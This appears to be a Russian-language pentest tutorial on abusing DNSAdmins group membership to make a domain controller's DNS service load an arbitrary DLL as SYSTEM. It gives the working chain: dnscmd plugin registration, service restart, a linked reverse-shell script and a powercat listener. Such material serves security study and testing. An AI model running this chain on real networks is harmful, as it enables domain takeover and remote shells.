# DNSAdmins

Microsoft не только реализовала собственный DNS-сервер, но и внедрила для него протокол управления, позволяющий интегрировать DNS-сервер с доменами Active Directory. По умолчанию контроллеры домена также являются DNS-серверами, поэтому DNS-серверы должны быть доступны каждому пользователю домена. Это, в свою очередь, открывает потенциальную возможность для атаки на контроллеры домена: с одной стороны мы имеем сам протокол DNS, а с другой — протокол управления, основанный на RPC.

Пользователь, входящий в группу DNSAdmins или имеющий права на запись в объекты DNS-сервера, может загрузить на DNS-сервер произвольную DLL с привилегиями System. Это очень опасно, поскольку многие корпоративные сети используют контроллер домена в качестве DNS-сервера.

Таким образом, для реализации атаки мы можем просто загрузить на DNS-сервер произвольную библиотеку с помощью dnscmd (путь `\\ops-build\dll` должен быть доступен для чтения DC):

```
PS C:\> dnscmd ops_dc/config/serverlevelplugindll \\ops-build\dll\mimilib.dll
```

Чтобы проверить, была ли загружена DLL, можно использовать следующую команду:

```
PS C:\> Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll
```

Так как наш пользователь — член группы DNSAdmins, мы можем перезапустить службу DNS:

```
C:\> sc \\ops-dc stop dns
C:\> sc \\ops-dc start dns
```

После перезапуска DNS-сервера будет выполнен код из загруженной библиотеки. Такая библиотека, например, может содержать [скрипт PowerShell для обратного подключения](https://github.com/samratashok/nishang).

После успешного выполнения скрипта мы будем прослушивать на своем хосте обратное подключение:

```
PS C:\> powercat -l -v -p 443 -t 1000
```

В результате мы получим права `system` на DC.
